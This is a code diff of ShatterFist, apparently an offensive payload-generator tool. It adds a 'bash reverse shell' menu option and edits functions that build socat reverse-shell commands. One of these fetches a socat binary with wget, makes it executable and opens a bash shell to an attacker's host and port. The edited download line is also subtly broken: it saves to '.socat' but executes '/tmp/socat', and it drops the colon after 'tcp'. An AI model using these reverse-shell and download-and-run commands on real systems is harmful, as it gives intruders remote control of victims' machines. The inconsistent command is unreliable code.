@@ -289,6 +289,7 @@ def linuxpayloadmenu():
     printopt("Create a simple Meterpreter elf payload (tcp)")
     printopt("Create a simple Meterpreter bash payload (tcp)")
     printopt("Create a simple Meterpreter sh payload (tcp)")
+    printopt("Create a bash reverse shell (tcp)")
     printopt2("E","Back to main menu")
     inputy = inputc("Option: ").strip()
     if inputy != "1" and inputy != "2" and inputy != "e":
@@ -390,7 +391,7 @@ def menu():
     printopt("Linux payload menu")
     #printopt("Miscellaneous payloads")
     printopt2("S", "Search for supported payloads")
-    printopt2("A", "Advanced menu shell for access to all supported payloads (recommended) ")
+    printopt2("A", "Advanced menu shell for access to all supported payloads (unfinished) ")
     #printopt2("C", "Custom payload")
     printopt2("M", "Start the Metasploit Framework Console")
     printopt2("E", "Exit ShatterFist")
@@ -505,9 +506,9 @@ def bash_udp_a_string(lport):
 
 # Socat Reverse TCP
 def socat_v_string1(lhost, lport):
-    return f"/tmp/socat exec:'bash -li',pty,stderr,setsid,sigint,sane tcp:{lhost}:{lport}"
+    return f".socat exec:'bash -li',pty,stderr,setsid,sigint,sane tcp:{lhost}:{lport}"
 def socat_v_string2(lhost, lport):
-    return f"wget -q https://github.com/andrew-d/static-binaries/raw/master/binaries/linux/x86_64/socat -O /tmp/socat; chmod +x /tmp/socat; /tmp/socat exec:'bash -li',pty,stderr,setsid,sigint,sane tcp{lhost}:{lport}"    
+    return f"wget -q https://github.com/andrew-d/static-binaries/raw/master/binaries/linux/x86_64/socat -O .socat; chmod +x /tmp/socat; /tmp/socat exec:'bash -li',pty,stderr,setsid,sigint,sane tcp{lhost}:{lport}"    
 def socat_a_string(lport):
     return  f"socat file:`tty`,raw,echo=0 TCP-L:{lport}"   
 
